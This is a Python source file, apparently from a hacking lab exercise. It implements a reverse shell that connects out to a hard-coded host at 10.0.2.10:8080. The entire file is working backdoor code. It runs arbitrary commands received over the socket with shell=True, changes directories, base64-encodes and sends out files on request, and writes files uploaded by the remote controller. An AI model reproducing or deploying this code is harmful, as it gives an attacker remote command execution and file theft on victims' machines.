import socket
import subprocess
import simplejson
import os
import base64

class Connection:
	def __init__(self,ip,port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_execution(self,command):
		return subprocess.check_output(command,shell=True)

	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data=""
		while True:
			try:
				json_data = self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to "+directory

	def read_file(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Upload successfull"

	def start_connection(self):
		while True:
			try:
				command = self.json_receive()
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					output = self.read_file(command[1])
				elif command[0] == "upload":
					output = self.save_file(command[1],command[2])
				else:
					output = self.command_execution(command)
			except Exception:
				output = "ERROR"
			self.json_send(output)
		self.my_connection.close()

my_connection = Connection("10.0.2.10",8080)
my_connection.start_connection()
